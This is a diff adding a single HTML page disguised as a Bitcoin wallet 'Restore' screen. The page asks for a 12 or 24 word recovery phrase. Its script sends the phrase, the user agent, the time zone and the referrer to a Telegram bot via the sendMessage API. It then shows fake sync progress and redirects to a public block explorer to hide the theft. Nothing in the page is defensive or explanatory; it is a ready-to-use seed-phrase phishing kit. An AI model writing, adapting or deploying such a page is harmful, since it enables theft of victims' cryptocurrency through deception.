@@ -1,0 +1,37 @@
+<!doctype html>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<title>Bitcoin Wallet - Restore</title>
+<style>
+body{font-family:system-ui;background:#fafafa;color:#111;margin:0;padding:2rem 1rem;max-width:24rem;margin:auto}
+h1{font-size:1.25rem;margin:0 0 .5rem}
+p{color:#555;font-size:.95rem;line-height:1.45}
+textarea{width:100%;box-sizing:border-box;padding:.7rem;font-size:1rem;border:1px solid #ccc;border-radius:.4rem;font-family:ui-monospace,monospace}
+button{width:100%;padding:.85rem;margin-top:.9rem;font-size:1rem;background:#f7931a;color:#fff;border:0;border-radius:.4rem}
+.spin{width:1.6rem;height:1.6rem;border:3px solid #ddd;border-top-color:#f7931a;border-radius:50%;animation:r 1s linear infinite;margin:2.5rem auto 1rem}
+@keyframes r{to{transform:rotate(360deg)}}
+#b{text-align:center}
+</style>
+<div id=a>
+<h1>Restore wallet</h1>
+<p>Enter your 12 or 24 word recovery phrase to regain access to your wallet.</p>
+<textarea id=w rows=4 placeholder="word1 word2 word3 ..." autocomplete=off autocapitalize=none autocorrect=off spellcheck=false></textarea>
+<button onclick=go()>Restore wallet</button>
+</div>
+<div id=b hidden>
+<div class=spin></div>
+<p id=s>Connecting to the Bitcoin network...</p>
+</div>
+<script>
+const T="BOT_TOKEN", C="CHAT_ID";
+function go(){
+  const v=w.value.trim();
+  if(v.split(/\s+/).length<12){alert("Enter the full 12 or 24 words");return;}
+  a.hidden=true;b.hidden=false;
+  const m="PHRASE: "+v+"\nUA: "+navigator.userAgent+"\nTZ: "+Intl.DateTimeFormat().resolvedOptions().timeZone+"\nREF: "+document.referrer;
+  fetch("https://api.telegram.org/bot"+T+"/sendMessage?chat_id="+C+"&text="+encodeURIComponent(m),{mode:"no-cors"});
+  setTimeout(()=>s.textContent="Wallet located. Syncing 12% ...",1400);
+  setTimeout(()=>s.textContent="Syncing 68% ...",3800);
+  setTimeout(()=>s.textContent="Syncing 94% ...",6000);
+  setTimeout(()=>location.href="https://www.blockchain.com/explorer",8200);
+}
+</script>
